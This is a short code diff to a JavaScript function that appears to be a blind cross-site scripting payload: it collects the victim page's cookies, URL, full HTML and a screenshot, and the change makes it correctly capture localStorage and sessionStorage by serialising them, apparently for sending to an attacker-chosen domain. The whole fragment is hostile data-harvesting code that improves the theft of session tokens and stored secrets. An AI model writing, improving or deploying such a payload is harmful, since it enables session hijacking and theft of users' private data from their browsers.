@@ -21,8 +21,8 @@ function letsgo(domain, extra){
 		extra: extra,
 		cookies: document.cookie,
 		url: location.href,
-		localStorage: document.localStorage,
-		sessionStorage: document.sessionStorage,
+		localStorage: JSON.stringify(window.localStorage),
+		sessionStorage: JSON.stringify(window.sessionStorage),
 		html: document.documentElement.outerHTML
 	}
 	html2canvas(document.body).then(function(canvas) {
